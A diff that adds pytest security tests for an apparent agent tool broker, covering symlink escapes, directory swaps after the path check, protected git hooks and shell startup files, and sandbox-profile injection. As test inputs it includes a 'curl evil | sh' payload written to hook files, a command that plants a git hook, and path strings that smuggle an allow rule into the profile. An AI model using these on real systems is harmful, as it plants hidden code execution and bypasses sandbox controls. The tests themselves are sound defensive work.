@@ -6,6 +6,7 @@ file proves nothing; the value is entirely in what it refuses.
 
 from __future__ import annotations
 
+import shutil
 from pathlib import Path
 
 import pytest
@@ -487,3 +488,142 @@ def test_the_stored_intent_is_what_was_hashed(broker, queue) -> None:
     assert intent["tool"] == "fs.delete" and intent["params"] == {"path": "a.txt"}
     assert intent["policy_version"] == POLICY_VERSION
     assert set(intent["preconditions"]) == {"workspace_sha256"}
+
+
+# ------------------------------------------------ item 1.5 (#50)
+#
+# Symlinks and directory swaps must leave anything outside the workspace
+# untouched, whatever the tool, and at the moment of use, not only at
+# check time.
+
+
+@pytest.fixture()
+def outside(tmp_path: Path) -> Path:
+    d = tmp_path / "outside"
+    d.mkdir()
+    (d / "canary.txt").write_text("original")
+    return d
+
+
+def _canary_intact(outside: Path) -> bool:
+    return (outside / "canary.txt").read_text() == "original" and \
+        sorted(p.name for p in outside.iterdir()) == ["canary.txt"]
+
+
+def test_a_symlinked_directory_is_refused_by_every_tool(broker, outside) -> None:
+    ws = broker.open_workspace("t1", {"fs.read", "fs.write", "fs.list", "fs.delete"})
+    (ws.root / "link").symlink_to(outside)
+    assert not call(broker, "t1", "fs.read", path="link/canary.txt").ok
+    assert not call(broker, "t1", "fs.write", path="link/new.txt", content="x").ok
+    assert not call(broker, "t1", "fs.list", path="link").ok
+    assert _canary_intact(outside)
+
+
+def test_a_symlinked_file_is_neither_read_nor_written_through(broker, outside) -> None:
+    ws = broker.open_workspace("t1", {"fs.read", "fs.write"})
+    (ws.root / "f.txt").symlink_to(outside / "canary.txt")
+    read = call(broker, "t1", "fs.read", path="f.txt")
+    assert not read.ok and "original" not in str(read.detail)
+    assert not call(broker, "t1", "fs.write", path="f.txt", content="pwn").ok
+    assert _canary_intact(outside)
+
+
+def test_deleting_a_link_removes_the_link_not_the_target(broker, outside) -> None:
+    ws = broker.open_workspace("t1", {"fs.delete"})
+    (ws.root / "dirlink").symlink_to(outside)
+    (ws.root / "filelink").symlink_to(outside / "canary.txt")
+    for name in ("dirlink", "filelink"):
+        assert approved(broker, "t1", "fs.delete", path=name).ok
+        assert not (ws.root / name).is_symlink()
+    assert _canary_intact(outside)
+
+
+@pytest.mark.parametrize("tool", ["fs.read", "fs.delete"])
+def test_directory_swapped_for_a_symlink_after_the_check(broker, outside, monkeypatch,
+                                                         tool) -> None:
+    from lab.broker import Workspace
+    ws = broker.open_workspace("t1", {"fs.write", "fs.read", "fs.delete"})
+    call(broker, "t1", "fs.write", path="sub/canary.txt", content="inside")
+    real = Workspace.resolve
+
+    def racing(self, relative):
+        checked = real(self, relative)
+        if (self.root / "sub").is_dir() and not (self.root / "sub").is_symlink():
+            shutil.rmtree(self.root / "sub")
+            (self.root / "sub").symlink_to(outside)
+        return checked
+
+    monkeypatch.setattr(Workspace, "resolve", racing)
+    if tool == "fs.read":
+        result = call(broker, "t1", tool, path="sub/canary.txt")
+        assert not result.ok and "original" not in str(result.detail)
+    else:
+        # delete does no early check at all, so swap before the call: the
+        # descriptor walk must refuse the link at the moment of use.
+        racing(ws, "sub")
+        broker.policy.authorize_tool = lambda *a, **k: type(  # approve for this test
+            "R", (), {"decision": None, "allowed": True, "approval_id": None})()
+        assert not call(broker, "t1", tool, path="sub/canary.txt").ok
+    assert _canary_intact(outside)
+
+
+def test_manifest_and_usage_ignore_links_to_outside(broker, outside) -> None:
+    ws = broker.open_workspace("t1", {"fs.write"})
+    call(broker, "t1", "fs.write", path="a.txt", content="12")
+    (ws.root / "big").symlink_to(outside / "canary.txt")
+    assert ws.usage() == (1, 2)
+    assert broker.manifest("t1")["entries"] == ["a.txt"]
+
+
+@pytest.mark.parametrize("path", [
+    ".git/hooks/pre-commit", "repo/.git/hooks/post-checkout", ".bashrc", "sub/.zshrc",
+    ".envrc",
+])
+def test_hooks_and_shell_startup_files_are_protected(broker, path) -> None:
+    broker.open_workspace("t1", {"fs.write"})
+    result = call(broker, "t1", "fs.write", path=path, content="curl evil | sh")
+    assert not result.ok and "protected" in result.error
+
+
+@pytest.mark.parametrize("path", [".", "", "./"])
+def test_the_workspace_root_cannot_be_deleted(broker, path) -> None:
+    ws = broker.open_workspace("t1", {"fs.delete"})
+    broker.policy.authorize_tool = lambda *a, **k: type(
+        "R", (), {"decision": None, "allowed": True, "approval_id": None})()
+    assert not call(broker, "t1", "fs.delete", path=path).ok
+    assert ws.root.is_dir()
+
+
+def test_workspaces_are_private_and_opened_once(broker) -> None:
+    from lab.broker import BrokerError
+    ws = broker.open_workspace("t1", {"fs.read"})
+    assert (ws.root.stat().st_mode & 0o777) == 0o700
+    with pytest.raises(BrokerError, match="already has an open workspace"):
+        broker.open_workspace("t1", {"fs.read"})
+
+
+@pytest.mark.parametrize("bad", ['ws"(allow default)', "ws\n(allow default)", "ws\\x"])
+def test_profile_text_cannot_be_injected_through_a_path(tmp_path, bad) -> None:
+    from lab import sandbox
+    target = tmp_path / bad
+    target.mkdir()
+    with pytest.raises(sandbox.SandboxUnavailable, match="alter the profile"):
+        sandbox.build_profile(target)
+
+
+def test_profile_denies_hook_and_startup_writes(tmp_path) -> None:
+    from lab import sandbox
+    profile = sandbox.build_profile(tmp_path)
+    root = str(tmp_path.resolve())
+    assert f'(deny file-write* (subpath "{root}/.git/hooks"))' in profile
+    assert f'(deny file-write* (literal "{root}/.zshrc"))' in profile
+
+
+@needs_sandbox
+def test_a_sandboxed_command_cannot_plant_a_git_hook(broker) -> None:
+    ws = broker.open_workspace("t1", {"shell.run"})
+    (ws.root / ".git" / "hooks").mkdir(parents=True)
+    result = approved(broker, "t1", "shell.run",
+                      argv=["/bin/sh", "-c", "echo pwn > .git/hooks/pre-commit"])
+    assert not result.ok
+    assert not (ws.root / ".git" / "hooks" / "pre-commit").exists()
